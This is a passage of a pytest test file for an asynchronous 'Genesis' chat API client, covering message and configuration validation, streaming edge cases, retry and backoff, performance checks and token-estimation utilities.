            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Verify session is reused across multiple requests
            session_before = client.session
            
            await client.create_chat_completion(
                messages=sample_messages,
                model_config=sample_model_config
            )
            
            session_after = client.session
            assert session_before is session_after
    
    def test_message_validation_with_control_characters(self, client):
        """Test message validation with control characters and special Unicode."""
        control_messages = [
            ChatMessage(role="user", content="Test\x00null\x01control\x02chars"),
            ChatMessage(role="user", content="Test\r\nCRLF\ttab"),
            ChatMessage(role="user", content="Test\u200B\u200C\u200D zero-width chars"),
            ChatMessage(role="user", content="Test\uFEFF\uFFFE\uFFFF special Unicode")
        ]
        
        for msg in control_messages:
            try:
                client._validate_messages([msg])
                # If validation passes, content should be preserved
                assert msg.content is not None
            except ValidationError:
                # Acceptable to reject control characters
                pass
    
    @pytest.mark.asyncio
    async def test_response_handling_with_unexpected_fields(self, client, sample_messages, sample_model_config):
        """Test handling of responses with unexpected additional fields."""
        response_with_extras = {
            'id': 'unexpected-fields-test',
            'choices': [{'message': {'content': 'Response with extras'}}],
            'usage': {'total_tokens': 15},
            'unexpected_field': 'should be ignored',
            'future_api_feature': {'nested': 'data'},
            'deprecated_field': None
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=response_with_extras)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await client.create_chat_completion(
                messages=sample_messages,
                model_config=sample_model_config
            )
            
            # Should handle extra fields gracefully
            assert result.id == 'unexpected-fields-test'
            assert result.choices[0].message.content == 'Response with extras'
    
    @pytest.mark.asyncio
    async def test_concurrent_streaming_with_different_models(self, client, sample_messages):
        """Test concurrent streaming with different model configurations."""
        model_configs = [
            ModelConfig(name="genesis-gpt-4", temperature=0.1),
            ModelConfig(name="genesis-gpt-3.5-turbo", temperature=0.9),
            ModelConfig(name="genesis-gpt-4", max_tokens=100)
        ]
        
        streaming_responses = [
            [{'choices': [{'delta': {'content': f'Model {i} response'}}]}]
            for i in range(len(model_configs))
        ]
        
        call_count = 0
        
        async def model_specific_stream():
            nonlocal call_count
            response = streaming_responses[call_count % len(streaming_responses)]
            call_count += 1
            for chunk in response:
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=model_specific_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Start concurrent streams with different models
            tasks = []
            for config in model_configs:
                task = asyncio.create_task(
                    client.create_chat_completion_stream(
                        messages=sample_messages,
                        model_config=config
                    ).__anext__()
                )
                tasks.append(task)
            
            results = await asyncio.gather(*tasks)
            assert len(results) == len(model_configs)


class TestAdvancedStreamingScenarios:
    """Advanced streaming test scenarios."""
    
    @pytest.mark.asyncio
    async def test_streaming_with_network_interruptions(self, client, sample_messages, sample_model_config):
        """Test streaming behavior with network interruptions and reconnection."""
        interruption_count = 0
        
        async def interrupted_stream():
            nonlocal interruption_count
            interruption_count += 1
            
            if interruption_count <= 2:
                # Simulate network interruption
                yield b'{"choices": [{"delta": {"content": "Start"}}]}\n'
                raise aiohttp.ClientConnectionError("Network interrupted")
            else:
                # Successful stream after reconnection
                yield b'{"choices": [{"delta": {"content": "Reconnected"}}]}\n'
                yield b'{"choices": [{"delta": {}, "finish_reason": "stop"}]}\n'
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=interrupted_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Should handle interruptions gracefully
            with pytest.raises(GenesisAPIError, match="Connection error"):
                async for chunk in client.create_chat_completion_stream(
                    messages=sample_messages,
                    model_config=sample_model_config
                ):
                    pass
    
    @pytest.mark.asyncio
    async def test_streaming_with_extremely_fast_responses(self, client, sample_messages, sample_model_config):
        """Test streaming with very fast response chunks."""
        fast_chunks = [
            {'choices': [{'delta': {'content': f'Fast{i}'}}]}
            for i in range(1000)  # 1000 rapid chunks
        ]
        fast_chunks.append({'choices': [{'delta': {}, 'finish_reason': 'stop'}]})
        
        async def fast_stream():
            for chunk in fast_chunks:
                yield json.dumps(chunk).encode()
                await asyncio.sleep(0.001)  # Very fast streaming
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=fast_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunks = []
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                chunks.append(chunk)
            
            # Should handle fast streaming without dropping chunks
            assert len(chunks) == 1001
    
    @pytest.mark.asyncio
    async def test_streaming_with_very_slow_responses(self, client, sample_messages, sample_model_config):
        """Test streaming with very slow response chunks."""
        slow_chunks = [
            {'choices': [{'delta': {'content': 'Slow'}}]},
            {'choices': [{'delta': {'content': ' response'}}]},
            {'choices': [{'delta': {}, 'finish_reason': 'stop'}]}
        ]
        
        async def slow_stream():
            for chunk in slow_chunks:
                await asyncio.sleep(0.5)  # Slow streaming
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=slow_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunks = []
            start_time = asyncio.get_event_loop().time()
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                chunks.append(chunk)
            end_time = asyncio.get_event_loop().time()
            
            # Should handle slow streaming patiently
            assert len(chunks) == 3
            assert end_time - start_time >= 1.0  # Should take at least 1 second
    
    @pytest.mark.asyncio
    async def test_streaming_with_binary_data_in_chunks(self, client, sample_messages, sample_model_config):
        """Test streaming behavior with binary data mixed in chunks."""
        mixed_chunks = [
            b'{"choices": [{"delta": {"content": "Normal"}}]}\n',
            b'\x89PNG\r\n\x1a\n',  # PNG header (binary data)
            b'{"choices": [{"delta": {"content": " text"}}]}\n',
            b'\x00\x01\x02\x03',  # More binary data
            b'{"choices": [{"delta": {}, "finish_reason": "stop"}]}\n'
        ]
        
        async def mixed_data_stream():
            for chunk in mixed_chunks:
                yield chunk
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mixed_data_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunks = []
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                chunks.append(chunk)
            
            # Should skip binary data and process valid JSON chunks
            valid_chunks = [c for c in chunks if hasattr(c, 'choices')]
            assert len(valid_chunks) >= 2  # At least the valid JSON chunks


class TestDataValidationEdgeCases:
    """Comprehensive data validation edge case testing."""
    
    def test_message_validation_with_numeric_content(self, client):
        """Test message validation with numeric content types."""
        numeric_messages = [
            ChatMessage(role="user", content=12345),
            ChatMessage(role="user", content=0),
            ChatMessage(role="user", content=-1),
            ChatMessage(role="user", content=3.14159),
            ChatMessage(role="user", content=float('inf')),
            ChatMessage(role="user", content=float('-inf')),
            ChatMessage(role="user", content=float('nan'))
        ]
        
        for msg in numeric_messages:
            try:
                client._validate_messages([msg])
                # If validation passes, content should be converted to string
                assert isinstance(msg.content, (str, int, float))
            except ValidationError:
                # Acceptable to reject non-string content
                pass
    
    def test_message_validation_with_complex_data_structures(self, client):
        """Test message validation with complex data structures."""
        complex_messages = [
            ChatMessage(role="user", content={"type": "text", "text": "Complex structure"}),
            ChatMessage(role="user", content=["item1", "item2", "item3"]),
            ChatMessage(role="user", content={"nested": {"deep": {"structure": "value"}}}),
            ChatMessage(role="user", content={"mixed": [1, "text", {"nested": True}]})
        ]
        
        for msg in complex_messages:
            try:
                client._validate_messages([msg])
                # If validation passes, should handle complex structures
                assert msg.content is not None
            except ValidationError:
                # Acceptable to reject complex structures
                pass
    
    def test_model_config_validation_with_extreme_values(self, client):
        """Test model config validation with extreme parameter values."""
        extreme_configs = [
            ModelConfig(name="test", temperature=0.0, max_tokens=1, top_p=0.0),
            ModelConfig(name="test", temperature=2.0, max_tokens=999999, top_p=1.0),
            ModelConfig(name="test", frequency_penalty=-2.0, presence_penalty=2.0),
            ModelConfig(name="test", temperature=1.0, max_tokens=2048, top_p=0.95)
        ]
        
        for config in extreme_configs:
            try:
                client._validate_model_config(config)
                # If validation passes, values should be within acceptable ranges
                assert 0.0 <= config.temperature <= 2.0
                assert config.max_tokens > 0
                assert 0.0 <= config.top_p <= 1.0
            except ValidationError:
                # Acceptable to reject extreme values
                pass
    
    def test_message_validation_with_empty_and_whitespace_variations(self, client):
        """Test message validation with various empty and whitespace patterns."""
        whitespace_messages = [
            ChatMessage(role="user", content=""),
            ChatMessage(role="user", content=" "),
            ChatMessage(role="user", content="\t"),
            ChatMessage(role="user", content="\n"),
            ChatMessage(role="user", content="\r\n"),
            ChatMessage(role="user", content="   \t\n\r   "),
            ChatMessage(role="user", content="\u00A0\u2000\u2001\u2002")  # Unicode spaces
        ]
        
        for msg in whitespace_messages:
            with pytest.raises(ValidationError, match="Message content cannot be empty"):
                client._validate_messages([msg])
    
    def test_message_validation_with_role_case_sensitivity(self, client):
        """Test message validation with role case sensitivity."""
        case_sensitive_messages = [
            ChatMessage(role="USER", content="Uppercase role"),
            ChatMessage(role="User", content="Capitalized role"),
            ChatMessage(role="ASSISTANT", content="Uppercase assistant"),
            ChatMessage(role="Assistant", content="Capitalized assistant"),
            ChatMessage(role="SYSTEM", content="Uppercase system"),
            ChatMessage(role="System", content="Capitalized system")
        ]
        
        for msg in case_sensitive_messages:
            with pytest.raises(ValidationError, match="Invalid message role"):
                client._validate_messages([msg])
    
    def test_model_config_validation_with_string_numeric_values(self, client):
        """Test model config validation with string representations of numbers."""
        string_numeric_config = ModelConfig(name="test-model")
        
        # Test string numbers
        test_cases = [
            ("temperature", "0.5"),
            ("max_tokens", "1000"),
            ("top_p", "0.9"),
            ("frequency_penalty", "0.1"),
            ("presence_penalty", "-0.1")
        ]
        
        for attr, value in test_cases:
            setattr(string_numeric_config, attr, value)
            try:
                client._validate_model_config(string_numeric_config)
                # If validation passes, should convert to proper numeric type
                assert isinstance(getattr(string_numeric_config, attr), (int, float, str))
            except ValidationError:
                # Acceptable to reject string numeric values
                pass


class TestErrorRecoveryPatterns:
    """Test error recovery and resilience patterns."""
    
    @pytest.mark.asyncio
    async def test_retry_with_exponential_backoff_verification(self, client, sample_messages, sample_model_config):
        """Test that retry implements proper exponential backoff."""
        call_times = []
        
        async def failing_request(*args, **kwargs):
            call_times.append(asyncio.get_event_loop().time())
            mock_response = Mock()
            mock_response.status = 500
            mock_response.json = AsyncMock(return_value={'error': {'message': 'Server error'}})
            return mock_response
        
        with patch('aiohttp.ClientSession.post', side_effect=failing_request):
            with patch('asyncio.sleep') as mock_sleep:
                with pytest.raises(GenesisAPIError):
                    await client.create_chat_completion(
                        messages=sample_messages,
                        model_config=sample_model_config
                    )
                
                # Verify exponential backoff was used
                if mock_sleep.call_count > 1:
                    sleep_times = [call.args[0] for call in mock_sleep.call_args_list]
                    # Each sleep should be longer than the previous (exponential backoff)
                    for i in range(1, len(sleep_times)):
                        assert sleep_times[i] >= sleep_times[i-1]
    
    @pytest.mark.asyncio
    async def test_partial_success_handling(self, client, sample_messages, sample_model_config):
        """Test handling of partial success scenarios."""
        partial_responses = [
            {'id': 'partial-1', 'choices': [{'message': {'content': 'Partial'}}]},  # Missing usage
            {'id': 'partial-2', 'choices': [], 'usage': {'total_tokens': 10}},  # Empty choices
            {'id': 'partial-3', 'choices': [{'message': {}}], 'usage': {'total_tokens': 5}}  # Empty message
        ]
        
        for response in partial_responses:
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=response)
                mock_post.return_value.__aenter__.return_value.status = 200
                
                try:
                    result = await client.create_chat_completion(
                        messages=sample_messages,
                        model_config=sample_model_config
                    )
                    # If successful, should handle partial data gracefully
                    assert result.id.startswith('partial-')
                except GenesisAPIError:
                    # Acceptable to fail on invalid partial responses
                    pass
    
    @pytest.mark.asyncio
    async def test_cascading_failure_handling(self, client, sample_messages, sample_model_config):
        """Test handling of cascading failures."""
        failure_sequence = [
            aiohttp.ClientConnectionError("Connection failed"),
            asyncio.TimeoutError("Request timed out"),
            aiohttp.ClientConnectionError("Connection failed again"),
            Mock(status=500, json=AsyncMock(return_value={'error': {'message': 'Server error'}}))
        ]
        
        call_count = 0
        
        async def cascading_failure(*args, **kwargs):
            nonlocal call_count
            if call_count < len(failure_sequence):
                failure = failure_sequence[call_count]
                call_count += 1
                if isinstance(failure, Exception):
                    raise failure
                return failure
            # Final success after all failures
            return Mock(
                status=200,
                json=AsyncMock(return_value={
                    'id': 'success-after-cascade',
                    'choices': [{'message': {'content': 'Success'}}],
                    'usage': {'total_tokens': 10}
                })
            )
        
        with patch('aiohttp.ClientSession.post', side_effect=cascading_failure):
            with patch('asyncio.sleep'):
                # Should eventually succeed or fail gracefully
                try:
                    result = await client.create_chat_completion(
                        messages=sample_messages,
                        model_config=sample_model_config
                    )
                    assert result.id == 'success-after-cascade'
                except GenesisAPIError:
                    # Acceptable to fail after max retries
                    pass
    
    @pytest.mark.asyncio
    async def test_memory_cleanup_on_failures(self, client, sample_messages, sample_model_config):
        """Test that memory is properly cleaned up on failures."""
        import gc
        
        initial_objects = len(gc.get_objects())
        
        # Cause multiple failures
        for _ in range(10):
            with patch('aiohttp.ClientSession.post', side_effect=Exception("Test failure")):
                with pytest.raises(GenesisAPIError):
                    await client.create_chat_completion(
                        messages=sample_messages,
                        model_config=sample_model_config
                    )
        
        # Force garbage collection
        gc.collect()
        final_objects = len(gc.get_objects())
        
        # Should not have significant memory leaks
        object_growth = final_objects - initial_objects
        assert object_growth < 1000  # Reasonable threshold for object growth


class TestPerformanceCharacteristics:
    """Test performance characteristics and efficiency."""
    
    @pytest.mark.asyncio
    async def test_response_time_consistency(self, client, sample_messages, sample_model_config):
        """Test response time consistency across multiple requests."""
        mock_response = {
            'id': 'performance-test',
            'choices': [{'message': {'content': 'Performance response'}}],
            'usage': {'total_tokens': 10}
        }
        
        response_times = []
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Make multiple requests and measure response time
            for _ in range(20):
                start_time = asyncio.get_event_loop().time()
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
                end_time = asyncio.get_event_loop().time()
                response_times.append(end_time - start_time)
        
        # Response times should be consistent (low variance)
        import statistics
        if len(response_times) > 1:
            mean_time = statistics.mean(response_times)
            std_dev = statistics.stdev(response_times)
            # Standard deviation should be reasonable relative to mean
            assert std_dev < mean_time * 2  # Within 200% of mean
    
    @pytest.mark.asyncio
    async def test_memory_usage_under_load(self, client, sample_messages, sample_model_config):
        """Test memory usage under sustained load."""
        import psutil
        import os
        
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss
        
        mock_response = {
            'id': 'memory-test',
            'choices': [{'message': {'content': 'Memory test response'}}],
            'usage': {'total_tokens': 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Make many requests to test memory usage
            for _ in range(100):
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
        
        final_memory = process.memory_info().rss
        memory_growth = final_memory - initial_memory
        
        # Memory growth should be reasonable (less than 100MB)
        assert memory_growth < 100 * 1024 * 1024  # 100MB threshold
    
    @pytest.mark.asyncio
    async def test_concurrent_request_performance(self, client, sample_messages, sample_model_config):
        """Test performance with concurrent requests."""
        mock_response = {
            'id': 'concurrent-perf-test',
            'choices': [{'message': {'content': 'Concurrent response'}}],
            'usage': {'total_tokens': 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Measure time for concurrent requests
            start_time = asyncio.get_event_loop().time()
            
            tasks = []
            for _ in range(50):
                task = client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
                tasks.append(task)
            
            results = await asyncio.gather(*tasks)
            end_time = asyncio.get_event_loop().time()
            
            # Concurrent execution should be efficient
            total_time = end_time - start_time
            assert len(results) == 50
            assert total_time < 10.0  # Should complete within 10 seconds
    
    @pytest.mark.asyncio
    async def test_streaming_performance_with_large_datasets(self, client, sample_messages, sample_model_config):
        """Test streaming performance with large datasets."""
        # Create a large number of small chunks
        large_chunks = [
            {'choices': [{'delta': {'content': f'Chunk {i} '}}]}
            for i in range(5000)
        ]
        large_chunks.append({'choices': [{'delta': {}, 'finish_reason': 'stop'}]})
        
        async def large_dataset_stream():
            for chunk in large_chunks:
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=large_dataset_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            start_time = asyncio.get_event_loop().time()
            chunks = []
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                chunks.append(chunk)
            end_time = asyncio.get_event_loop().time()
            
            # Should handle large datasets efficiently
            assert len(chunks) == 5001
            processing_time = end_time - start_time
            assert processing_time < 30.0  # Should complete within 30 seconds


class TestConfigurationValidation:
    """Comprehensive configuration validation tests."""
    
    def test_configuration_with_environment_variables(self):
        """Test configuration using environment variables."""
        import os
        
        # Test with environment variables
        os.environ['GENESIS_API_KEY'] = 'env-api-key'
        os.environ['GENESIS_BASE_URL'] = 'https://env.genesis.ai'
        
        try:
            # Should be able to use environment variables if supported
            client = GenesisAPIClient()
            assert client.api_key is not None
        except (ValueError, TypeError):
            # Acceptable if environment variables aren't supported
            pass
        finally:
            # Clean up environment variables
            os.environ.pop('GENESIS_API_KEY', None)
            os.environ.pop('GENESIS_BASE_URL', None)
    
    def test_configuration_validation_with_invalid_urls(self):
        """Test configuration validation with various invalid URLs."""
        invalid_urls = [
            "not-a-url",
            "ftp://invalid.com",
            "http://",
            "https://",
            "//invalid.com",
            "http:///path",
            "https://invalid..com",
            "http://localhost:-1",
            "https://[invalid-ipv6]"
        ]
        
        for url in invalid_urls:
            with pytest.raises(ValueError, match="Invalid base URL"):
                GenesisAPIClient(api_key="test-key", base_url=url)
    
    def test_configuration_with_custom_headers_validation(self):
        """Test configuration with custom headers validation."""
        valid_headers = [
            {'X-Custom-Header': 'value'},
            {'User-Agent': 'CustomAgent/1.0'},
            {'Accept': 'application/json'},
            {'X-API-Version': '2023-01-01'}
        ]
        
        for headers in valid_headers:
            try:
                client = GenesisAPIClient(api_key="test-key", headers=headers)
                built_headers = client._build_headers()
                # Custom headers should be included
                for key, value in headers.items():
                    assert key in built_headers or built_headers.get(key) == value
            except (ValueError, TypeError):
                # Acceptable if custom headers aren't supported in constructor
                pass
    
    def test_configuration_with_proxy_settings(self):
        """Test configuration with proxy settings."""
        proxy_configs = [
            {'proxy': 'http://proxy.example.com:8080'},
            {'proxy': 'https://secure-proxy.example.com:443'},
            {'proxy': 'socks5://socks.example.com:1080'}
        ]
        
        for config in proxy_configs:
            try:
                client = GenesisAPIClient(api_key="test-key", **config)
                # Should initialize without errors
                assert client.api_key == "test-key"
            except (ValueError, TypeError):
                # Acceptable if proxy settings aren't supported
                pass
    
    def test_configuration_immutability_after_creation(self):
        """Test that configuration is immutable after client creation."""
        client = GenesisAPIClient(api_key="test-key")
        
        original_values = {
            'api_key': client.api_key,
            'base_url': client.base_url,
            'timeout': client.timeout,
            'max_retries': client.max_retries
        }
        
        # Attempt to modify configuration
        modification_attempts = [
            ('api_key', 'modified-key'),
            ('base_url', 'https://malicious.com'),
            ('timeout', 999),
            ('max_retries', 100)
        ]
        
        for attr, value in modification_attempts:
            try:
                setattr(client, attr, value)
                # If modification succeeds, verify it's controlled
                current_value = getattr(client, attr)
                assert current_value == value or current_value == original_values[attr]
            except AttributeError:
                # Expected if properties are read-only
                pass
    
    @pytest.mark.parametrize("timeout_value", [0.001, 0.1, 1, 30, 300, 3600])
    def test_timeout_configuration_boundary_values(self, timeout_value):
        """Test timeout configuration with various boundary values."""
        try:
            client = GenesisAPIClient(api_key="test-key", timeout=timeout_value)
            assert client.timeout == timeout_value or client.timeout > 0
        except ValueError:
            # Some extreme values might be rejected
            assert timeout_value < 0.01 or timeout_value > 3600
    
    @pytest.mark.parametrize("retry_value", [0, 1, 3, 5, 10, 20])
    def test_retry_configuration_boundary_values(self, retry_value):
        """Test retry configuration with various boundary values."""
        try:
            client = GenesisAPIClient(api_key="test-key", max_retries=retry_value)
            assert client.max_retries == retry_value or client.max_retries >= 0
        except ValueError:
            # Some extreme values might be rejected
            assert retry_value < 0 or retry_value > 20


class TestUtilityFunctionsComprehensive:
    """Comprehensive tests for utility functions."""
    
    def test_format_timestamp_with_various_formats(self):
        """Test timestamp formatting with various input formats."""
        from app.ai_backend.genesis_api import format_timestamp
        
        timestamp_formats = [
            1677610602,  # Unix timestamp
            1677610602.123,  # Unix timestamp with milliseconds
            '1677610602',  # String timestamp
            '2023-02-28T15:30:02Z',  # ISO format
            datetime.now(timezone.utc),  # Datetime object
        ]
        
        for ts in timestamp_formats:
            try:
                formatted = format_timestamp(ts)
                assert isinstance(formatted, str)
                assert len(formatted) > 0
            except (ValueError, TypeError):
                # Acceptable if certain formats aren't supported
                pass
    
    def test_calculate_token_usage_with_complex_messages(self):
        """Test token usage calculation with complex message structures."""
        from app.ai_backend.genesis_api import calculate_token_usage
        
        complex_message_sets = [
            # Mixed content types
            [
                ChatMessage(role="user", content="Simple text"),
                ChatMessage(role="assistant", content="Response with more complex content including special characters: !@#$%^&*()")
            ],
            # Messages with names
            [
                ChatMessage(role="user", content="Hello", name="Alice"),
                ChatMessage(role="assistant", content="Hi Alice!"),
                ChatMessage(role="user", content="How are you?", name="Bob")
            ],
            # Very long messages
            [
                ChatMessage(role="user", content="x" * 1000),
                ChatMessage(role="assistant", content="y" * 2000)
            ],
            # Messages with Unicode
            [
                ChatMessage(role="user", content="Hello 世界! 🌍"),
                ChatMessage(role="assistant", content="Bonjour le monde! 🇫🇷")
            ]
        ]
        
        for messages in complex_message_sets:
            usage = calculate_token_usage(messages)
            assert isinstance(usage, dict)
            assert 'estimated_tokens' in usage
            assert isinstance(usage['estimated_tokens'], int)
            assert usage['estimated_tokens'] >= 0
    
    def test_estimate_tokens_with_various_encodings(self):
        """Test token estimation with various text encodings."""
        from app.ai_backend.genesis_api import estimate_tokens
        
        encoding_tests = [
            "ASCII text",
            "UTF-8 text with émojis 🎉",
            "Mixed: ASCII + UTF-8 + 中文",
            "Кириллица",
            "العربية",
            "עברית",
            "हिन्दी",
            "日本語",
            "한국어",
            "🎵🎶🎸🎤🎧"  # Emoji only
        ]
        
        for text in encoding_tests:
            tokens = estimate_tokens(text)
            assert isinstance(tokens, int)
            assert tokens >= 0
            # Should have some relationship to text length
            assert tokens <= len(text.split()) + 10  # Reasonable upper bound
    
    def test_utility_function_error_handling(self):
        """Test error handling in utility functions."""
        from app.ai_backend.genesis_api import format_timestamp, calculate_token_usage, estimate_tokens
        
        # Test invalid inputs
        invalid_inputs = [
            None,
            [],
            {},
            "invalid",
            -1,
            float('inf'),
            float('nan')
        ]
        
        for invalid_input in invalid_inputs:
            # format_timestamp with invalid input
            try:
                result = format_timestamp(invalid_input)
                assert isinstance(result, str)  # Should handle gracefully
            except (ValueError, TypeError):
                pass  # Acceptable to raise errors
            
            # estimate_tokens with invalid input
            try:
                result = estimate_tokens(invalid_input)
                assert isinstance(result, int)  # Should handle gracefully
            except (ValueError, TypeError):
                pass  # Acceptable to raise errors
        
        # calculate_token_usage with invalid messages
        try:
            result = calculate_token_usage(None)
            assert isinstance(result, dict)
        except (ValueError, TypeError):
            pass  # Acceptable to raise errors
    
    def test_utility_function_performance(self):
        """Test performance of utility functions."""
        from app.ai_backend.genesis_api import estimate_tokens, calculate_token_usage
        
        # Test with large inputs
        large_text = "word " * 10000  # 10K words
        large_messages = [
            ChatMessage(role="user", content=large_text),
            ChatMessage(role="assistant", content=large_text)
        ]
        
        import time
        
        # Test estimate_tokens performance
        start_time = time.time()
        tokens = estimate_tokens(large_text)
        end_time = time.time()
        
        assert isinstance(tokens, int)
        assert tokens > 0
        assert end_time - start_time < 1.0  # Should complete within 1 second
        
        # Test calculate_token_usage performance
        start_time = time.time()
        usage = calculate_token_usage(large_messages)
        end_time = time.time()
        
        assert isinstance(usage, dict)
        assert 'estimated_tokens' in usage
        assert end_time - start_time < 1.0  # Should complete within 1 second


if __name__ == "__main__":
    # Run comprehensive tests with extended markers
    pytest.main([
        __file__,
        "-v",
        "--tb=short",
        "-k", "TestGenesisAPIClientRobustness or TestAdvancedStreamingScenarios or TestDataValidationEdgeCases or TestErrorRecoveryPatterns or TestPerformanceCharacteristics or TestConfigurationValidation or TestUtilityFunctionsComprehensive",
        "--durations=10"
    ])

class TestGenesisAPIClientAdvancedEdgeCases:
    """Additional comprehensive edge case tests for Genesis API client."""
    
    @pytest.fixture
    def client_with_extreme_config(self):
        """Create a client with extreme configuration values for boundary testing."""
        return GenesisAPIClient(
            api_key='extreme-test-key',
            timeout=0.01,  # Very short timeout
            max_retries=0  # No retries
        )
    
    @pytest.mark.asyncio
    async def test_request_cancellation_during_streaming(self, client, sample_messages, sample_model_config):
        """Test request cancellation during active streaming."""
        async def slow_stream():
            for i in range(100):
                yield json.dumps({'choices': [{'delta': {'content': f'chunk {i}'}}]}).encode()
                await asyncio.sleep(0.01)  # Slow streaming
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=slow_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Start streaming and cancel after short delay
            stream_task = asyncio.create_task(
                client.create_chat_completion_stream(
                    messages=sample_messages,
                    model_config=sample_model_config
                ).__anext__()
            )
            
            await asyncio.sleep(0.05)  # Let some chunks process
            stream_task.cancel()
            
            with pytest.raises(asyncio.CancelledError):
                await stream_task
    
    @pytest.mark.asyncio
    async def test_session_state_persistence_across_errors(self, client, sample_messages, sample_model_config):
        """Test that session state remains consistent across various error conditions."""
        original_session = client.session
        
        # Simulate multiple different error types
        error_scenarios = [
            aiohttp.ClientConnectionError("Connection failed"),
            asyncio.TimeoutError("Request timeout"),
            aiohttp.ClientResponseError(
                request_info=Mock(),
                history=(),
                status=429,
                message="Rate limited"
            )
        ]
        
        for error in error_scenarios:
            with patch('aiohttp.ClientSession.post', side_effect=error):
                with pytest.raises(GenesisAPIError):
                    await client.create_chat_completion(
                        messages=sample_messages,
                        model_config=sample_model_config
                    )
                
                # Session should remain the same object
                assert client.session is original_session
                assert not client.session.closed
    
    def test_message_validation_with_deeply_nested_structures(self, client):
        """Test message validation with deeply nested content structures."""
        deeply_nested_content = {
            "level1": {
                "level2": {
                    "level3": {
                        "level4": {
                            "level5": {
                                "text": "Deep nesting test",
                                "metadata": {
                                    "timestamp": "2023-01-01T00:00:00Z",
                                    "user_id": 12345,
                                    "session_data": {
                                        "preferences": ["pref1", "pref2"],
                                        "history": [
                                            {"action": "login", "time": "2023-01-01T00:00:00Z"},
                                            {"action": "query", "time": "2023-01-01T00:00:01Z"}
                                        ]
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        
        nested_message = ChatMessage(role="user", content=deeply_nested_content)
        
        # Should handle or reject deeply nested structures gracefully
        try:
            client._validate_messages([nested_message])
        except ValidationError as e:
            assert "content" in str(e).lower() or "structure" in str(e).lower()
    
    def test_model_config_validation_with_scientific_notation(self, client):
        """Test model config validation with scientific notation values."""
        config = ModelConfig(name="test-model")
        
        scientific_values = [
            ("temperature", 1e-6),  # Very small scientific notation
            ("temperature", 1.5e0),  # Scientific notation for normal value
            ("top_p", 9.99e-1),     # Almost 1 in scientific notation
            ("max_tokens", 1e3),    # 1000 in scientific notation
            ("frequency_penalty", -2e0),  # Negative scientific notation
        ]
        
        for attr, value in scientific_values:
            setattr(config, attr, value)
            try:
                client._validate_model_config(config)
                # Should handle scientific notation properly
                actual_value = getattr(config, attr)
                assert abs(actual_value - value) < 1e-10  # Floating point comparison
            except ValidationError:
                # Acceptable if scientific notation values are rejected
                pass
    
    @pytest.mark.asyncio
    async def test_streaming_with_binary_encoding_issues(self, client, sample_messages, sample_model_config):
        """Test streaming with various binary encoding issues."""
        problematic_chunks = [
            b'{"choices": [{"delta": {"content": "Valid start"}}]}\n',
            b'\xff\xfe',  # Invalid UTF-8 BOM
            b'{"choices": [{"delta": {"content": "After bad encoding"}}]}\n',
            b'\x80\x81\x82',  # Invalid UTF-8 bytes
            b'{"choices": [{"delta": {}, "finish_reason": "stop"}]}\n'
        ]
        
        async def problematic_stream():
            for chunk in problematic_chunks:
                yield chunk
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=problematic_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunks = []
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                chunks.append(chunk)
            
            # Should handle encoding issues gracefully and process valid chunks
            valid_chunks = [c for c in chunks if hasattr(c, 'choices') and c.choices]
            assert len(valid_chunks) >= 1
    
    @pytest.mark.asyncio
